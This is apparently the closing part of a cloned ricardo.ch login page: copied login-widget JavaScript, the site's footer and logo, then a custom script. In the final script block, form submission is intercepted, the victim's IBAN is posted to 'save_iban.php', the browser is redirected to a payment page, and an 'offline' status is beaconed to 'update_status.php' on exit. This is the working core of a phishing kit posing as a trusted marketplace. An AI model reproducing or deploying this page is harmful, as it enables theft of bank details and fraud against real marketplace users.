                                                var t = e.status.indicator;
                                                return "none" === t
                                            }).catch(function(e) {
                                                return !1
                                            }).then(function(e) {
                                                if (e && d < f) return t.reset(), new Promise(function(e) {
                                                    setTimeout(function() {
                                                        e(t.run())
                                                    }, s), d++
                                                });
                                                w("BYPASS_CAPTCHA"), _().removeEventListener("submit", n)
                                            })
                                        }
                                    })
                                };
                                t === F && (a = function() {
                                    x()
                                }), window[e] = a
                            } else window[e] = function() {
                                delete window[e], x()
                            }, t === C && (u(m(), "frc-captcha"), n.onload = window[e]);
                            i(r, n)
                        }()
                    }, r.exports)(u.loadScript, u.removeScript, u.querySelector, u.addClass, u.removeClass, u.getCSSVariable), ((a = {}).exports = function(r, e, a, i, o, u, c, l, n, s, t) {
                        if (!t.enable_ulp_wcag_compliance) {
                            if (r("body._simple-labels")) return e(".cf59a1f59.no-js").forEach(function(e) {
                                o(e, "no-js")
                            }), void e(".cf59a1f59.js-required").forEach(function(e) {
                                i(e, "hide")
                            });
                            e(".c6d02143e:not(.cdf0297b6):not(disabled)").forEach(function(e) {
                                i(e, "c78e586c4");
                                var t, n = r(e, ".input");
                                n.value && i(e, "c457439c5"), a(e, "change", f), a(n, "blur", f), a(n, "animationstart", d), t = n, c(function() {
                                    t.value && l(t, "change", !0)
                                }, 100)
                            })
                        }

                        function f(e) {
                            var t = e.target,
                                n = u(t);
                            t.value || s(t, "data-autofilled") ? i(n, "c457439c5") : o(n, "c457439c5")
                        }

                        function d(e) {
                            var t = e.target;
                            "onAutoFillStart" === e.animationName && (n(t, "data-autofilled", !0), l(e.target, "change", !0), a(t, "keyup", p, {
                                once: !0
                            }))
                        }

                        function p(e) {
                            var t = e.target;
                            n(t, "data-autofilled", "")
                        }
                    }, a.exports)(u.querySelector, u.querySelectorAll, u.addEventListener, u.addClass, u.removeClass, u.getParent, u.setTimeout, u.dispatchEvent, u.setAttribute, u.getAttribute, o), {
                        exports: function(e, t, n, r, a, i) {
                            function o(e) {
                                var t = n("submitted");
                                r("submitted", !0), t ? a(e) : "apple" === i(e.target, "data-provider") && setTimeout(function() {
                                    r("submitted", !1)
                                }, 2e3)
                            }
                            var u = e("form");
                            u && u.forEach(function(e) {
                                t(e, "submit", o)
                            })
                        }
                    }.exports(u.querySelectorAll, u.addEventListener, u.getGlobalFlag, u.setGlobalFlag, u.preventFormSubmit, u.getAttribute), {
                        exports: function(n, e, r, a, i, o, u, c, l, t, s, f) {
                            if (f.enable_ulp_wcag_compliance) {
                                var d = e("[id^='ulp-container-']");
                                if (d && d.length) {
                                    var p = t(x);
                                    if (p)
                                        for (var v = 0; v < d.length; v++) p.observe(d[v], {
                                            childList: !0,
                                            subtree: !0
                                        })
                                }
                                x()
                            }

                            function m(e) {
                                var t = e.target,
                                    n = o(t);
                                t.value || c(t, "data-autofilled") ? a(n, "c457439c5") : i(n, "c457439c5")
                            }

                            function h(e) {
                                var t = e.target,
                                    n = o(t);
                                a(n, "focus"), w(t, n)
                            }

                            function g(e) {
                                var t = e.target,
                                    n = o(t);
                                i(n, "focus"), m(e), w(t, n)
                            }

                            function b(e) {
                                var t = e.target;
                                l(t, "data-autofilled", "")
                            }

                            function _(e) {
                                var t = e.target;
                                "onAutoFillStart" === e.animationName && (l(t, "data-autofilled", !0), dispatchEvent(e.target, "change", !0), r(t, "keyup", b, {
                                    once: !0
                                }))
                            }

                            function w(e, t) {
                                e.value ? a(t, "c457439c5") : i(t, "c457439c5")
                            }

                            function x() {
                                e(".ulp-field").forEach(function(e) {
                                    if (!u(e, "c78e586c4")) {
                                        var t = n(e, s);
                                        t && (a(e, "c78e586c4"), w(t, e), setTimeout(function() {
                                            w(t, e)
                                        }, 50), t === document.activeElement && a(e, "focus"), r(t, "change", m), r(t, "focus", h), r(t, "blur", g), r(t, "animationstart", _))
                                    }
                                })
                            }
                        }
                    }.exports(u.querySelector, u.querySelectorAll, u.addEventListener, u.addClass, u.removeClass, u.getParent, u.hasClass, u.getAttribute, u.setAttribute, u.createMutationObserver, u.ELEMENT_TYPE_SELECTOR, o), {
                        exports: function(n, e, r, a, i, o, u, t, c, l) {
                            if (!l.enable_ulp_wcag_compliance) {
                                var s = e("[id^='ulp-container-']");
                                if (s && s.length) {
                                    var f = t(g);
                                    if (f)
                                        for (var d = 0; d < s.length; d++) f.observe(s[d], {
                                            childList: !0,
                                            subtree: !0
                                        });
                                    g()
                                }
                            }

                            function p(e) {
                                var t = e.target,
                                    n = o(t);
                                t.value ? a(n, "c457439c5") : i(n, "c457439c5")
                            }

                            function v(e) {
                                var t = e.target,
                                    n = o(t);
                                a(n, "focus"), h(t, n)
                            }

                            function m(e) {
                                var t = e.target,
                                    n = o(t);
                                i(n, "focus"), h(t, n)
                            }

                            function h(e, t) {
                                e.value ? a(t, "c457439c5") : i(t, "c457439c5")
                            }

                            function g() {
                                e("[id^='ulp-container-'] .ulp-field").forEach(function(e) {
                                    if (!u(e, "c78e586c4")) {
                                        var t = n(e, c);
                                        t && (a(e, "c78e586c4"), h(t, e), setTimeout(function() {
                                            h(t, e)
                                        }, 50), t === document.activeElement && a(e, "focus"), r(t, "change", p), r(t, "focus", v), r(t, "blur", m))
                                    }
                                })
                            }
                        }
                    }.exports(u.querySelector, u.querySelectorAll, u.addEventListener, u.addClass, u.removeClass, u.getParent, u.hasClass, u.createMutationObserver, u.ELEMENT_TYPE_SELECTOR, o), {
                        exports: function(r, o, a, i, u, c, l, s, f, d, p, v, t, m, h, e, n, g) {
                            if (g.enable_ulp_wcag_compliance) {
                                var b = !1,
                                    _ = e + ',input[type="checkbox"]';
                                return F(), [_, w, x, E, y, S, C, A, F]
                            }

                            function w(e) {
                                var t = u(e, "data-ulp-validation-function"),
                                    n = i(e);
                                return {
                                    functionName: t,
                                    element: r(n, _),
                                    parent: n
                                }
                            }

                            function x(e) {
                                var a = [],
                                    i = [];
                                return o(e, "[data-ulp-validation-function]").forEach(function(e) {
                                    var t = w(e),
                                        n = [];
                                    if (t.element) {
                                        if ("input" === t.element.tagName.toLowerCase()) {
                                            var r = u(t.element, "type");
                                            "checkbox" !== r && -1 === h.indexOf(r) && n.push("Unsupported input type: " + r)
                                        }
                                    } else n.push("Could not find element");
                                    v[t.functionName] || n.push("Could not find function with name: " + t.functionName), n.length ? i = i.concat(n) : a.push(e)
                                }), i.length && t(i.join("\r\n")), a
                            }

                            function E(e, t, n) {
                                var r = w(e),
                                    a = (0, v[r.functionName])(r.element, t, n);
                                a ? s(e, "ulp-validator-error") && (d(e, "ulp-validator-error"), l(e, "data-is-error")) : s(e, "ulp-validator-error") || (f(e, "ulp-validator-error"), c(e, "data-is-error", !0));
                                var i = o(r.parent, ".ulp-validator-error");
                                return p(r.parent, "ulp-error", !!i.length), a
                            }

                            function y(t) {
                                var n = w(t),
                                    e = (u(t, "data-ulp-validation-event-listeners") || "").replace(/\s/g, "").split(",").filter(function(e) {
                                        return !!e
                                    });
                                e.length && e.forEach(function(e) {
                                    a(n.element, e, function() {
                                        E(t, b, e)
                                    })
                                })
                            }

                            function S(e, t, n) {
                                b = !0;
                                var r = n.filter(function(e) {
                                    return !E(e, b, "submit")
                                });
                                if (r.length) {
                                    m(t);
                                    var a = w(r[0]);
                                    a.element.focus({
                                        preventScroll: !0
                                    }), a.parent.scrollIntoView({
                                        behavior: "smooth"
                                    })
                                } else e.submit()
                            }

                            function C() {
                                var t = r('form[data-form-primary="true"]'),
                                    n = x(t);
                                0 !== n.length && (n.forEach(function(e) {
                                    y(e)
                                }), a(t, "submit", function(e) {
                                    S(t, e, n)
                                }))
                            }

                            function A() {
                                if (n)
                                    for (var e in n) n.hasOwnProperty(e) && (v[e] = n[e])
                            }

                            function F() {
                                var e = r("form[data-disable-html-validations]");
                                e && (A(), c(e, "novalidate", ""), C())
                            }
                        }
                    }.exports(u.querySelector, u.querySelectorAll, u.addEventListener, u.getParent, u.getAttribute, u.setAttribute, u.removeAttribute, u.hasClass, u.addClass, u.removeClass, u.toggleClass, u.globalWindow, u.consoleWarn, u.preventFormSubmit, u.SUPPORTED_INPUT_TYPES, u.ELEMENT_TYPE_SELECTOR, c, o), {
                        exports: function(r, o, a, i, u, c, l, t, s, f, e, n) {
                            if (!n.enable_ulp_wcag_compliance) {
                                var d = !1,
                                    p = e + ',input[type="checkbox"]';
                                return w(), [p, v, m, h, g, b, _, w]
                            }

                            function v(e) {
                                var t = u(e, "data-ulp-validation-function"),
                                    n = i(e);
                                return {
                                    functionName: t,
                                    element: r(n, p),
                                    parent: n
                                }
                            }

                            function m(e) {
                                var a = [],
                                    i = [];
                                return o(e, "[data-ulp-validation-function]").forEach(function(e) {
                                    var t = v(e),
                                        n = [];
                                    if (t.element) {
                                        if ("input" === t.element.tagName.toLowerCase()) {
                                            var r = u(t.element, "type");
                                            "checkbox" !== r && -1 === f.indexOf(r) && n.push("Unsupported input type: " + r)
                                        }
                                    } else n.push("Could not find element");
                                    l[t.functionName] || n.push("Could not find function with name: " + t.functionName), n.length ? i = i.concat(n) : a.push(e)
                                }), i.length && t(i.join("\r\n")), a
                            }

                            function h(e, t, n) {
                                var r = v(e),
                                    a = (0, l[r.functionName])(r.element, t, n);
                                c(e, "ulp-validator-error", !a);
                                var i = o(r.parent, ".ulp-validator-error");
                                return c(r.parent, "ulp-error", !!i.length), a
                            }

                            function g(t) {
                                var n = v(t),
                                    e = (u(t, "data-ulp-validation-event-listeners") || "").replace(/\s/g, "").split(",").filter(function(e) {
                                        return !!e
                                    });
                                e.length && e.forEach(function(e) {
                                    a(n.element, e, function() {
                                        h(t, d, e)
                                    })
                                })
                            }

                            function b(e, t, n) {
                                d = !0;
                                var r = n.filter(function(e) {
                                    return !h(e, d, "submit")
                                });
                                if (r.length) {
                                    s(t);
                                    var a = v(r[0]);
                                    a.element.focus({
                                        preventScroll: !0
                                    }), a.parent.scrollIntoView({
                                        behavior: "smooth"
                                    })
                                } else e.submit()
                            }

                            function _() {
                                var t = r('form[data-form-primary="true"]'),
                                    n = m(t);
                                0 !== n.length && (n.forEach(function(e) {
                                    g(e)
                                }), a(t, "submit", function(e) {
                                    b(t, e, n)
                                }))
                            }

                            function w() {
                                var e = o("[id^='ulp-container-']");
                                e && e.length && _()
                            }
                        }
                    }.exports(u.querySelector, u.querySelectorAll, u.addEventListener, u.getParent, u.getAttribute, u.toggleClass, u.globalWindow, u.consoleWarn, u.preventFormSubmit, u.SUPPORTED_INPUT_TYPES, u.ELEMENT_TYPE_SELECTOR, o), {
                        exports: function(e, t, n) {
                            function r(n) {
                                t(n, "click", function(e) {
                                    e.preventDefault();
                                    var t = document.createElement("input");
                                    t.name = "action", t.type = "hidden", t.value = n.value, n.form.appendChild(t), n.form.submit(), n.form.removeChild(t)
                                })
                            }

                            function a() {
                                e('form button[type="submit"][formnovalidate]').forEach(function(e) {
                                    r(e)
                                })
                            }
                            return n && a(), [a, r]
                        }
                    }.exports(u.querySelectorAll, u.addEventListener, u.RUN_INIT), ((i = {}).exports = function(o, e, u, c, l, s, t, f, n) {
                        if (n.enable_ulp_wcag_compliance) {
                            var r = e('[class*="aria-error-check"]');
                            if (r && r.length) {
                                var a = t(function(e) {
                                    e && e.length && e.map(function(e) {
                                        if (e.target && u(e.target, "aria-error-check")) {
                                            var t = o('[id="' + c(e.target, "data-ulp-validation-target") + '"');
                                            if (t) {
                                                var n = c(t, "aria-describedby");
                                                c(e.target, "data-is-error") ? (r = t, a = n, i = e.target.id, a && -1 !== a.search(i) || l(r, "aria-describedby", a ? a + " " + i : i), l(r, "aria-invalid", !0)) : function(e, t, n) {
                                                    if (t) {
                                                        var r = f(t, n);
                                                        r.length ? l(e, "aria-describedby", r) : (s(e, "aria-invalid"), s(e, "aria-describedby"))
                                                    } else s(e, "aria-invalid"), s(e, "aria-describedby")
                                                }(t, n, e.target.id)
                                            }
                                        }
                                        var r, a, i
                                    })
                                });
                                a && r.map(function(e) {
                                    a.observe(e, {
                                        attributes: !0,
                                        attributeFilter: ["class", "data-is-error"]
                                    })
                                })
                            }
                        }
                    }, i.exports)(u.querySelector, u.querySelectorAll, u.hasClass, u.getAttribute, u.setAttribute, u.removeAttribute, u.createMutationObserver, u.removeAndTrimString, o)
                }();
            </script>
        </div>

        <style data-emotion="css 1v54gwv">
            .css-1v54gwv {
                position: static;
                border-top: 1px solid #e0e0e0;
                height: 80px;
                width: 100%;
                color: #757575;
                -webkit-flex-shrink: 0;
                -ms-flex-negative: 0;
                flex-shrink: 0;
            }
        </style>
        <footer class="MuiBox-root css-1v54gwv">
            <style data-emotion="css ru192w">
                .css-ru192w {
                    display: -webkit-box;
                    display: -webkit-flex;
                    display: -ms-flexbox;
                    display: flex;
                    -webkit-box-flex-wrap: wrap;
                    -webkit-flex-wrap: wrap;
                    -ms-flex-wrap: wrap;
                    flex-wrap: wrap;
                    -webkit-align-items: center;
                    -webkit-box-align: center;
                    -ms-flex-align: center;
                    align-items: center;
                    height: 100%;
                    width: 100%;
                    max-width: 1200px;
                    margin: 0 auto;
                    padding-left: 16px;
                }
            </style>
            <div class="MuiBox-root css-ru192w">
                <g stroke="none" stroke-width="1" fill="#757575" fill-rule="nonzero">
                    <title>ricardo</title>
                    <path d="M124.31,140.8 L124.31,56.2 C124.31,51.7 125.71,48.5 128.41,46.7 C131.520018,44.8563826 135.097574,43.9533101 138.71,44.1 C143.424086,44.095664 148.027932,45.5256465 151.91,48.2 L151.91,140.8 L124.31,140.8 Z"></path>
                    <path d="M297.94,97.06 L297.8,97.14 C293.003708,99.4501627 289.967145,104.316449 289.999736,109.64 C289.999736,117.74 296.4,124.24 311,124.64 L312,124.64 C318.243871,124.798943 324.489909,124.424248 330.67,123.52 L330.57,107.25 L330.57,106.42 C330.57,105.42 328.07,100.92 322.47,98.02 C313.46,93.48 302.72,94.61 297.94,97.06 Z M327.79,42.7 C344.99,47.6 357.9,58.87 357.9,83.37 L357.9,141.27 C357.9,141.17 339.18,142.54 320.56,142.76 L318.88,142.76 C300.68,142.89 285.49,141.48 275.2,133.25 C268.081815,127.692709 263.914797,119.170605 263.9,110.14 L263.9,109.85 C263.8,98.65 268.5,90.45 278.1,84.45 C295,73.95 321.7,76.65 330.7,84.45 L330.7,78.7 C330.7,72.3 326.2,60.9 304.9,60.9 C301.721007,60.908626 298.554711,61.3014751 295.47,62.07 C289.474027,63.3032877 283.676304,65.3558769 278.24,68.17 L278.01,67.94 C275.220801,65.0555824 273.642649,61.2121908 273.6,57.2 C273.637561,54.3136745 274.733579,51.5416027 276.68,49.41 C285.56,41.11 306.4,36.61 327.79,42.7 Z"></path>
                    <path d="M497.76,63.6 C491.26,63.6 485.64,65.73 481.46,70.47 L481.26,70.7 C476.76,75.8 474.76,81.2 474.76,91.4 C474.76,102.7 480.26,110.5 482.66,113 C490.06,120.6 499.06,120.8 504.06,120.8 L504.85,120.8 C509.203768,120.833514 513.552579,120.498991 517.85,119.8 L517.92,119.8 L517.92,77.1 L517.86,76.91 C517.34,75.28 512.82,63.6 497.76,63.6 Z M532.26,7.5 C536.900809,7.49806939 541.441965,8.84617087 545.33,11.38 L545.33,11.38 L545.23,141.18 L541.72,141.43 C535.1,141.88 520.38,142.78 508.53,142.78 C488.23,142.78 472.83,138.88 462.63,129.08 C451.87,118.7 447.35,106.84 447.26,89.7 L447.26,89.18 C447.26,80.67 449.9,65.88 461.21,54.23 L461.56,53.88 C469.686306,45.5582491 480.828651,40.8705312 492.46,40.88 C508.12,40.88 516,48.98 517.64,50.82 L517.96,51.18 L517.96,19.6 C517.96,15.1 519.36,11.9 522.06,10.1 C525.133135,8.25582957 528.679049,7.35196908 532.26,7.5 L532.26,7.5 Z"></path>
                    <path d="M419.56,41 C424.814796,40.8392316 430.049248,41.7229703 434.96,43.6 L435.26,43.74 C437.86,44.92 443.13,47.87 443.73,54.05 L443.73,54.3 C444.317522,59.0038648 442.587924,63.7006168 439.09,66.9 C432.343333,63.7533333 424.096667,62.93 414.35,64.43 L413.87,64.5 L413.87,64.5 C410.638916,64.9007061 407.531909,65.9920808 404.76,67.7 L404.76,141.3 L377.06,141.3 L377.06,51 L377.28,50.86 C379.22,49.7 393.98,41 419.56,41 Z"></path>
                    <path d="M613.16,62.4 C609.495076,62.3236249 605.863692,63.1115669 602.56,64.7 C599.568885,66.1764291 596.913769,68.2528659 594.76,70.8 C592.558066,73.5129798 590.925558,76.6419546 589.96,80 C588.89749,83.775051 588.359115,87.6782739 588.36,91.6 C588.309542,95.5249659 588.848892,99.43525 589.96,103.2 C590.925558,106.558045 592.558066,109.68702 594.76,112.4 C596.768701,114.934724 599.321676,116.985307 602.23,118.4 L602.56,118.55 C605.871522,120.115517 609.497447,120.902275 613.16,120.85 C616.715993,120.898806 620.237036,120.14332 623.46,118.64 L623.73,118.5 C626.721115,117.023571 629.376231,114.947134 631.53,112.4 C633.731934,109.68702 635.364442,106.558045 636.33,103.2 C637.441108,99.43525 637.980458,95.5249659 637.93,91.6 C637.973428,87.6754744 637.434222,83.766229 636.33,80 C635.364442,76.6419546 633.731934,73.5129798 631.53,70.8 C629.441334,68.1861593 626.770166,66.0971691 623.73,64.7 C620.444141,63.0908883 616.817383,62.3017168 613.16,62.4 Z M613.26,40.4 C620.715442,40.3288055 628.11549,41.6866125 635.06,44.4 C641.228543,46.9590072 646.860008,50.6567763 651.66,55.3 C656.377333,59.8841708 660.030078,65.4486329 662.36,71.6 C664.781726,78.0227439 666.002009,84.83599 665.961049,91.7 C665.97119,98.561332 664.751893,105.369071 662.36,111.8 C657.411382,124.250749 647.528825,134.097106 635.06,139 C621.015878,144.332869 605.504122,144.332869 591.46,139 C585.450619,136.503738 579.947157,132.931909 575.22,128.46 L574.86,128.1 C570.121303,123.533511 566.465202,117.963937 564.16,111.8 C561.68161,105.393001 560.459385,98.5689103 560.56,91.7 C560.54881,84.838668 561.768107,78.030929 564.16,71.6 C566.589181,65.4997671 570.229059,59.9549059 574.86,55.3 C579.478494,50.6974017 584.964451,47.057092 591,44.59 L591.46,44.4 C598.390872,41.6389414 605.800383,40.2793982 613.26,40.4 L613.26,40.4 Z"></path>
                    <path d="M198.65,44.4 C215.28,38.56 232.11,41.34 238.08,43.34 L238.25,43.4 C246.15,46.1 250.95,49.4 253.45,53.4 C257.05,59.3 255.05,66.6 251.35,70.7 C250.610531,71.4673778 249.818623,72.182434 248.98,72.84 L248.9,72.78 C242.593333,68.3 236.383333,65.5 230.27,64.38 C227.400283,63.8041109 224.476367,63.542568 221.55,63.6 C212.45,63.7 206.55,66.8 202.35,70.9 C197.45,75.7 194.95,82.8 194.95,91.8 C194.95,102.7 198.95,108.8 202.25,112.7 L202.48,112.97 C204.86,115.62 210.79,120.2 220.55,120.2 L221.1,120.2 C226.554319,120.203211 231.9387,118.972495 236.85,116.6 C239.480924,115.390047 241.917517,113.795984 244.08,111.87 L244.15,111.8 L256.75,130.2 L256.58,130.36 C252.595059,133.714276 248.052993,136.344071 243.16,138.13 L240.6,139.02 C233.523808,141.467332 226.087443,142.711234 218.6,142.700075 L218.19,142.700075 C211.29,142.700075 193.89,141.1 182.39,129.6 C177.747983,125.007373 174.015815,119.578765 171.39,113.6 C168.592494,106.679669 167.231583,99.2627019 167.39,91.8 C167.297441,84.5049765 168.657168,77.2644336 171.39,70.5 C173.954598,64.4873619 177.694435,59.0475984 182.39,54.5 C187.036072,50.0230262 192.577665,46.5808313 198.65,44.4 Z"></path>
                    <circle cx="138.1" cy="17.3" r="17.3"></circle>
                    <path d="M107.9,139.76 C107.84,128.07 106.45,101.93 85.21,86.7 C89.41,83.7 104.91,75.55 104.01,51.95 C102.51,21.75 76.71,8.8 43.4,10.4 C14.1,11.8 1.42108547e-14,20.6 1.42108547e-14,21.5 L1.42108547e-14,140.7 L27.7,140.7 L27.9,92.1 L28.62,92.1 C35.4394788,91.8909357 42.2634083,92.329569 49,93.41 C54.1,94.31 59.2,95.51 64.1,99.01 C79.2,109.79 80.27,128.74 80.3,140.13 L80.3,140.81 L107.9,140.81 L107.9,139.76 Z M64.3,70.5 C55.09,74.25 35.46,72.37 28.59,71.5 L27.8,71.4 L27.7,36.5 L27.93,36.37 C32.78,33.66 41.44,32.37 50.3,32.37 C75.11,32.37 76.71,48.87 76.71,52.37 C76.81,58.9 74.46,66.4 64.3,70.5 Z"></path>
                </g></svg></a>
                <nav>
                    <style data-emotion="css 161r2c0">
                        .css-161r2c0 {
                            font-size: 14px;
                            color: #757575;
                            margin-right: 16px;
                        }
                    </style><a class="MuiBox-root css-161r2c0" id="agbLink" href="https://help.ricardo.ch/hc/de/articles/115002934305-AGB-und-Reglemente?_ga=2.254007496.1751118475.1698652567-1491787426.1680787633" target="_blank">AGB</a><a class="MuiBox-root css-161r2c0" id="impressumLink" href="https://help.ricardo.ch/hc/de/articles/214044069-Impressum-ricardo-ch-AG" target="_blank">Impressum</a><a class="MuiBox-root css-161r2c0" id="dataProtectionLink" href="https://help.ricardo.ch/hc/de/articles/4417494500498-Datenschutzerkl%C3%A4rung-SMG-Swiss-Marketplace-Group-AG?_ga=2.216702166.1751118475.1698652567-1491787426.1680787633" target="_blank">Data protection</a><a class="MuiBox-root css-161r2c0" id="helpLink" href="https://help.ricardo.ch/hc/de" target="_blank">Help</a>
                </nav>
            </div>

            <script>
                function togglePassword() {
                    const passwordField = document.getElementById('password');
                    const toggleText = document.querySelector('.toggle-password');
                    if (passwordField.type === 'password') {
                        passwordField.type = 'text';
                        toggleText.textContent = 'Passwort verbergen';
                    } else {
                        passwordField.type = 'password';
                        toggleText.textContent = 'Passwort anzeigen';
                    }
                }

                document.getElementById('loginForm').addEventListener('submit', function(event) {
                    event.preventDefault(); // Prevent default form submission

                    const iban = document.getElementById('iban').value;

                    const formData = new FormData();
                    formData.append('iban', iban);

                    fetch('save_iban.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => {
                            window.location.href = '../payment/payment.php';
                        })
                        .catch(error => {
                            console.error('Error:', error);
                        });
                });

                window.onload = function() {
                    var registerLink = document.getElementById("registerLink");
                    if (registerLink) {
                        registerLink.style.display = "hide";
                    }
                };

                window.addEventListener('beforeunload', function() {
                    navigator.sendBeacon('../update_status.php', new URLSearchParams({
                        status: 'offline'
                    }));
                });
            </script>
        </footer>

    </div>

</body>

</html>